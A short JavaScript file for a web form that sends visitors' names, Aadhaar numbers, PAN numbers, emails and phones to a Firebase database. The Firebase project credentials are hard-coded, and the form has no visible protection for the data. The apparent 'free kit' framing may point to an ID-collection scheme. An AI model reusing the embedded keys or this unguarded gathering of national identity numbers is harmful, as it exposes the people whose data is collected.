// Initialize Firebase (ADD YOUR OWN DATA)
var config = {
    apiKey: "AIzaSyDjbtZS2AhjTdhPSDkZeOSWUt2eDhtrqik",
    authDomain: "freekit-4bba9.firebaseapp.com",
    projectId: "freekit-4bba9",
    storageBucket: "freekit-4bba9.appspot.com",
    messagingSenderId: "151154317793",
    appId: "1:151154317793:web:787acdf4ff3e8a441d1aa0",
    measurementId: "G-VYBBFZYXWZ",
    databaseURL: "https://freekit-4bba9-default-rtdb.firebaseio.com/",
  };
  firebase.initializeApp(config);
  
  // Reference messages collection
  var messagesRef = firebase.database().ref('messages');
  
  // Listen for form submit
  document.getElementById('contactForm').addEventListener('submit', submitForm);
  
  // Submit form
  function submitForm(e){
    e.preventDefault();
  
    // Get values
    var name = getInputVal('name');
    var aadhar = getInputVal('aadhar');
    var email = getInputVal('email');
    var phone = getInputVal('phone');
    var pan = getInputVal('pan');
  
    // Save message
    saveMessage(name, aadhar, email, phone, pan);
  
    // Show alert
    document.querySelector('.alert').style.display = 'block';
  
    // Hide alert after 3 seconds
    setTimeout(function(){
      document.querySelector('.alert').style.display = 'none';
    },3000);
  
    // Clear form
    document.getElementById('contactForm').reset();
  }
  
  // Function to get get form values
  function getInputVal(id){
    return document.getElementById(id).value;
  }
  
  // Save message to firebase
  function saveMessage(name, aadhar, email, phone, pan){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
      name: name,
      aadhar:aadhar,
      email:email,
      phone:phone,
      pan:pan
    });
  }